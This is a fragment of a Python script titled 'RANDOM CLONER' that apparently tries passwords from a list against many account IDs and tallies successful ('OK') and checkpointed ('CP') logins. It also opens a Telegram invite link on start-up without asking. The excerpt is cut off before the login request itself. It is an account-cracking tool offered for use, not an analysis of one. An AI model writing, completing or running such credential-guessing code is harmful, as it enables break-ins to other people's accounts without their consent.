...
class Mr_Code:
    ...
    os.system(" xdg-open https://t.me/+l8hzsGplmB82NmI1")
    def banner(self):
        os.system("clear")
        print("DEVELOPER  : Noman")
        print("FEATURE    : RANDOM CLONER")
        print("TELIGERM : https://t.me/+l8hzsGplmB82NmI1 ")
        print("VERSION    : 1.2")
        print("----------------------------------")
    ...
    def method(self,ids,passlist):
        global loop,oks,cps
        sys.stdout.write(f"\r\r\x1b[Noman {self.loop}|RND|OK:-{len(self.oks)}|CP:-{len(self.cps)}")
        sys.stdout.flush()
        try:
            for pas in passlist:
                data = {
